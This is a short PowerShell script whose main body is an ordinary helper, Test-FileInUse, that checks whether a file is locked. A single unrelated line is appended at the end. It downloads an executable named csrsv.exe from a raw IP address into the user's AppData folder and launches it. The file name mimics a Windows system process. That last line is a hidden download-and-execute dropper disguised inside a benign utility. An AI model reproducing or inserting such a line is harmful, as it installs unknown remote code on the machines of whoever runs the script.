function Test-FileInUse
{
    [CmdletBinding()]
    [OutputType([bool])]
    param
    (
        [string]
        $FilePath
    )

    if(Microsoft.PowerShell.Management\Test-Path -LiteralPath $FilePath -PathType Leaf)
    {
        
        try
        {
            $fileInfo = New-Object System.IO.FileInfo $FilePath
            $fileStream = $fileInfo.Open( [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::None )

            if ($fileStream)
            {
                $fileStream.Close()
            }
        }
        catch
        {
            Write-Debug "In Test-FileInUse function, unable to open the $FilePath file in ReadWrite access. $_"
            return $true
        }
    }

    return $false
}
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

